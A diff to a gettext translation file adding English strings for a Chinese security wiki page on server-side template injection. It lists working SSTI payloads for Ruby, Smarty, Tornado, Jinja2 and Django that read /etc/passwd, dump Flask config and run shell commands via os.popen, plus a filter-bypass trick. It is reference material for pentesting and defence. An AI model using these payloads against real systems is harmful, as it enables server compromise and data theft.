@@ -20,280 +20,280 @@ msgstr ""
 
 #: ../../source/vuln/ssti.rst:2
 msgid "模版注入"
-msgstr ""
+msgstr "Template Injection"
 
 #: ../../source/vuln/ssti.rst:5
 msgid "简介"
-msgstr ""
+msgstr "Introduction"
 
 #: ../../source/vuln/ssti.rst:6
 msgid "模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。"
-msgstr ""
+msgstr "Template engines are used to render content with dynamic data. This context data is often user-controlled and is formatted by templates to generate web pages, emails, and other output. Template engines process context data with code constructs such as conditionals and loops, allowing powerful language expressions inside templates to render dynamic content. If an attacker can control the template being rendered, they can inject expressions that expose context data or even execute arbitrary commands on the server."
 
 #: ../../source/vuln/ssti.rst:9
 msgid "测试方法"
-msgstr ""
+msgstr "Testing Method"
 
 #: ../../source/vuln/ssti.rst:10
 msgid "确定使用的引擎"
-msgstr ""
+msgstr "Identify the engine in use"
 
 #: ../../source/vuln/ssti.rst:11
 msgid "查看引擎相关的文档，确定其安全机制以及自带的函数和变量"
-msgstr ""
+msgstr "Review the engine documentation to understand its security mechanisms and built-in functions and variables"
 
 #: ../../source/vuln/ssti.rst:12
 msgid "需找攻击面，尝试攻击"
-msgstr ""
+msgstr "Find the attack surface and attempt exploitation"
 
 #: ../../source/vuln/ssti.rst:15
 msgid "测试用例"
-msgstr ""
+msgstr "Test Cases"
 
 #: ../../source/vuln/ssti.rst:16
 msgid "简单的数学表达式，``{{ 7+7 }} => 14``"
-msgstr ""
+msgstr "Simple mathematical expression, ``{{ 7+7 }} => 14``"
 
 #: ../../source/vuln/ssti.rst:17
 msgid "字符串表达式 ``{{ \"ajin\" }} => ajin``"
-msgstr ""
+msgstr "String expression, ``{{ \"ajin\" }} => ajin``"
 
 #: ../../source/vuln/ssti.rst:18
 msgid "Ruby"
-msgstr ""
+msgstr "Ruby"
 
 #: ../../source/vuln/ssti.rst:19
 msgid "``<%= 7 * 7 %>``"
-msgstr ""
+msgstr "``<%= 7 * 7 %>``"
 
 #: ../../source/vuln/ssti.rst:20
 msgid "``<%= File.open('/etc/passwd').read %>``"
-msgstr ""
+msgstr "``<%= File.open('/etc/passwd').read %>``"
 
 #: ../../source/vuln/ssti.rst:21
 msgid "Java"
-msgstr ""
+msgstr "Java"
 
 #: ../../source/vuln/ssti.rst:22
 #, python-brace-format
 msgid "``${7*7}``"
-msgstr ""
+msgstr "``${7*7}``"
 
 #: ../../source/vuln/ssti.rst:23
 msgid "Twig"
-msgstr ""
+msgstr "Twig"
 
 #: ../../source/vuln/ssti.rst:24
 msgid "``{{7*7}}``"
-msgstr ""
+msgstr "``{{7*7}}``"
 
 #: ../../source/vuln/ssti.rst:25
 msgid "Smarty"
-msgstr ""
+msgstr "Smarty"
 
 #: ../../source/vuln/ssti.rst:26
 #, python-brace-format
 msgid "``{php}echo `id`;{/php}``"
-msgstr ""
+msgstr "``{php}echo `id`;{/php}``"
 
 #: ../../source/vuln/ssti.rst:27
 msgid "AngularJS"
-msgstr ""
+msgstr "AngularJS"
 
 #: ../../source/vuln/ssti.rst:28
 msgid "``$eval('1+1')``"
-msgstr ""
+msgstr "``$eval('1+1')``"
 
 #: ../../source/vuln/ssti.rst:29
 msgid "Tornado"
-msgstr ""
+msgstr "Tornado"
 
 #: ../../source/vuln/ssti.rst:30
 #, python-brace-format, python-format
 msgid "引用模块 ``{% import module %}``"
-msgstr ""
+msgstr "Import a module: ``{% import module %}``"
 
 #: ../../source/vuln/ssti.rst:31
 #, python-brace-format, python-format
 msgid "=> ``{% import os %}{{ os.popen(\"whoami\").read() }}``"
-msgstr ""
+msgstr "=> ``{% import os %}{{ os.popen(\"whoami\").read() }}``"
 
 #: ../../source/vuln/ssti.rst:32
 msgid "Flask/Jinja2"
-msgstr ""
+msgstr "Flask/Jinja2"
 
 #: ../../source/vuln/ssti.rst:33
 msgid "``{{ config }}``"
-msgstr ""
+msgstr "``{{ config }}``"
 
 #: ../../source/vuln/ssti.rst:34
 msgid "``{{ config.items() }}``"
-msgstr ""
+msgstr "``{{ config.items() }}``"
 
 #: ../../source/vuln/ssti.rst:35
 msgid "``{{get_flashed_messages.__globals__['current_app'].config}}``"
-msgstr ""
+msgstr "``{{get_flashed_messages.__globals__['current_app'].config}}``"
 
 #: ../../source/vuln/ssti.rst:36
 msgid "``{{''.__class__.__mro__[-1].__subclasses__()}}``"
-msgstr ""
+msgstr "``{{''.__class__.__mro__[-1].__subclasses__()}}``"
 
 #: ../../source/vuln/ssti.rst:37
 msgid ""
 "``{{ url_for.__globals__['__builtins__'].__import__('os').system('ls') "
 "}}``"
-msgstr ""
+msgstr "``{{ url_for.__globals__['__builtins__'].__import__('os').system('ls') }}``"
 
 #: ../../source/vuln/ssti.rst:38
 msgid ""
 "``{{ "
 "request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() "
 "}}``"
-msgstr ""
+msgstr "``{{ request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}``"
 
 #: ../../source/vuln/ssti.rst:39
 msgid "Django"
-msgstr ""
+msgstr "Django"
 
 #: ../../source/vuln/ssti.rst:40
 msgid "``{{ request }}``"
-msgstr ""
+msgstr "``{{ request }}``"
 
 #: ../../source/vuln/ssti.rst:41
 #, python-brace-format, python-format
 msgid "``{% debug %}``"
-msgstr ""
+msgstr "``{% debug %}``"
 
 #: ../../source/vuln/ssti.rst:42
 #, python-brace-format, python-format
 msgid "``{% load module %}``"
-msgstr ""
+msgstr "``{% load module %}``"
 
 #: ../../source/vuln/ssti.rst:43
 #, python-brace-format, python-format
 msgid "``{% include \"x.html\" %}``"
-msgstr ""
+msgstr "``{% include \"x.html\" %}``"
 
 #: ../../source/vuln/ssti.rst:44
 #, python-brace-format, python-format
 msgid "``{% extends \"x.html\" %}``"
-msgstr ""
+msgstr "``{% extends \"x.html\" %}``"
 
 #: ../../source/vuln/ssti.rst:47
 msgid "目标"
-msgstr ""
+msgstr "Objectives"
 
 #: ../../source/vuln/ssti.rst:48
 msgid "创建对象"
-msgstr ""
+msgstr "Create objects"
 
 #: ../../source/vuln/ssti.rst:49
 msgid "文件读写"
-msgstr ""
+msgstr "File read and write"
 
 #: ../../source/vuln/ssti.rst:50
 msgid "远程文件包含"
-msgstr ""
+msgstr "Remote file inclusion"
 
 #: ../../source/vuln/ssti.rst:51
 msgid "信息泄漏"
-msgstr ""
+msgstr "Information disclosure"
 
 #: ../../source/vuln/ssti.rst:52
 msgid "提权"
-msgstr ""
+msgstr "Privilege escalation"
 
 #: ../../source/vuln/ssti.rst:55
 msgid "相关属性"
-msgstr ""
+msgstr "Related Attributes"
 
 #: ../../source/vuln/ssti.rst:58
 msgid "``__class__``"
-msgstr ""
+msgstr "``__class__``"
 
 #: ../../source/vuln/ssti.rst:59
 msgid ""
 "python中的新式类（即显示继承object对象的类）都有一个属性 ``__class__`` 用于获取当前实例对应的类，例如 "
 "``\"\".__class__`` 就可以获取到字符串实例对应的类"
-msgstr ""
+msgstr "New-style classes in Python, meaning classes that explicitly inherit from ``object``, have an attribute named ``__class__`` that obtains the class corresponding to the current instance. For example, ``\"\".__class__`` obtains the class corresponding to a string instance."
 
 #: ../../source/vuln/ssti.rst:62
 msgid "``__mro__``"
-msgstr ""
+msgstr "``__mro__``"
 
 #: ../../source/vuln/ssti.rst:63
 msgid ""
 "python中类对象的 ``__mro__`` "
 "属性会返回一个tuple对象，其中包含了当前类对象所有继承的基类，tuple中元素的顺序是MRO（Method Resolution Order）"
 " 寻找的顺序。"
-msgstr ""
+msgstr "In Python, the ``__mro__`` attribute of a class object returns a tuple containing all base classes inherited by the current class object. The order of elements in the tuple is the lookup order used by MRO (Method Resolution Order)."
 
 #: ../../source/vuln/ssti.rst:66
 msgid "``__globals__``"
-msgstr ""
+msgstr "``__globals__``"
 
 #: ../../source/vuln/ssti.rst:67
 msgid ""
 "保存了函数所有的所有全局变量，在利用中，可以使用 ``__init__`` 获取对象的函数，并通过 ``__globals__`` 获取 "
 "``file`` ``os`` 等模块以进行下一步的利用"
-msgstr ""
+msgstr "This stores all global variables of a function. During exploitation, ``__init__`` can be used to obtain an object's function, and ``__globals__`` can then be used to obtain modules such as ``file`` and ``os`` for the next exploitation step."
 
 #: ../../source/vuln/ssti.rst:70
 msgid "``__subclasses__()``"
-msgstr ""
+msgstr "``__subclasses__()``"
 
 #: ../../source/vuln/ssti.rst:71
 msgid ""
 "python的新式类都保留了它所有的子类的引用，``__subclasses__()`` "
 "这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。"
-msgstr ""
+msgstr "Python new-style classes keep references to all of their subclasses. The ``__subclasses__()`` method returns references to all live subclasses of a class; these are class object references, not instances."
 
 #: ../../source/vuln/ssti.rst:73
 msgid ""
 "因为python中的类都是继承object的，所以只要调用object类对象的 ``__subclasses__()`` "
 "方法就可以获取想要的类的对象。"
-msgstr ""
+msgstr "Because classes in Python inherit from ``object``, calling the ``__subclasses__()`` method on the ``object`` class object can be used to obtain the desired class object."
 
 #: ../../source/vuln/ssti.rst:76
 msgid "常见Payload"
-msgstr ""
+msgstr "Common Payloads"
 
 #: ../../source/vuln/ssti.rst:77
 msgid "``().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()``"
-msgstr ""
+msgstr "``().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()``"
 
 #: ../../source/vuln/ssti.rst:78
 msgid ""
 "``().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls"
 " /\").read()' )``"
-msgstr ""
+msgstr "``().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls /\").read()' )``"
 
 #: ../../source/vuln/ssti.rst:81
 msgid "绕过技巧"
-msgstr ""
+msgstr "Bypass Techniques"
 
 #: ../../source/vuln/ssti.rst:84
 msgid "字符串拼接"
-msgstr ""
+msgstr "String Concatenation"
 
 #: ../../source/vuln/ssti.rst:85
 msgid "``request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]``"
-msgstr ""
+msgstr "``request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]``"
 
 #: ../../source/vuln/ssti.rst:88
 msgid "使用参数绕过"
-msgstr ""
+msgstr "Bypass with Parameters"
 
 #: ../../source/vuln/ssti.rst:103
 msgid "参考链接"
-msgstr ""
+msgstr "References"
 
 #: ../../source/vuln/ssti.rst:104
 msgid "`服务端模版注入 <https://zhuanlan.zhihu.com/p/28823933>`_"
-msgstr ""
+msgstr "`Server-Side Template Injection <https://zhuanlan.zhihu.com/p/28823933>`_"
 
 #: ../../source/vuln/ssti.rst:105
 msgid ""
 "`用Python特性任意代码执行 <http://blog.knownsec.com/2016/02/use-python-features-"
 "to-execute-arbitrary-codes-in-jinja2-templates/>`_"
-msgstr ""
+msgstr "`Using Python Features for Arbitrary Code Execution <http://blog.knownsec.com/2016/02/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/>`_"
